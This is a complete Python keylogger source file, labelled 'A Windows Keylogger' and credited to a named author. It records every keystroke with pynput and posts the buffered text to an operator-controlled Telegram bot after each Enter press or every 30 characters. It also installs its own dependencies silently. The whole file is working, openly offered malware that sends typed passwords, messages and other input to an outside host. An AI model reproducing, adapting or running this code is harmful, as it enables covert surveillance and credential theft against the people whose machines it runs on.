'''
                        Author: Tanvir ahmed (chy)
            Github: https://github.com/TanvirAhmedChowdhury/
                        A Windows Keylogger





'''

import os
import requests
from pynput.keyboard import Listener
import threading

class Install:
    try:
        import requests
        from pynput import mouse
        from pynput import keyboard
        import threading
    except:
        os.system("pip install requests")
        os.system("pip install pynput")
        os.system("pip install threading")
        import requests
        from pynput import mouse
        from pynput import keyboard
        import threading

def __init__():
    Install

class Send:
    @staticmethod
    def send_text_via_bot(bot_token, chat_id, text):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': text}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("")
            else:
                print("Failed to send text. Status code:", response.status_code)
        except Exception as e:
            print(f"An error occurred: {e}")

    @staticmethod
    def send_text_async(bot_token, chat_id, text):
        # Use threading to send text asynchronously
        thread = threading.Thread(target=Send.send_text_via_bot, args=(bot_token, chat_id, text))
        thread.start()


class Main:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log = ""

    def write_to_file(self, key):
        letter = str(key).replace("'", "")
        garbage = ['Key.tab', 'Key.shift_r', 'Key.ctrl_l', 'Key.alt_l', 'Key.up', 'Key.down', 'Key.backspace', 
                   'Key.right', 'Key.left', 'Key.shift', 'alt', 'alt_gr', 'alt_l', 'alt_r', 
                   'caps_lock', 'cmd', 'cmd_l', 'cmd_r', 'ctrl', 'ctrl_l', 'ctrl_r', 'delete']

        if letter == 'Key.enter':
            letter = '\n'
            self.log += letter
            # Send log when press enter
            Send.send_text_async(self.bot_token, self.chat_id, self.log)
            self.log = ""  # Clear log after sending
        elif letter == 'Key.space':
            letter = ' '
            self.log += letter
        elif letter not in garbage:
            self.log += letter

        if len(self.log) > 30: 
            Send.send_text_async(self.bot_token, self.chat_id, self.log)
            self.log = ""

    def run(self):
        with Listener(on_press=self.write_to_file) as l:
            l.join()


bot_token = 'REPLACE_Your_TG_BOT_TOKEN'
chat_id = 'REPLACE_YOUR_TG_CHAT_ID'
main = Main(bot_token, chat_id)
main.run()
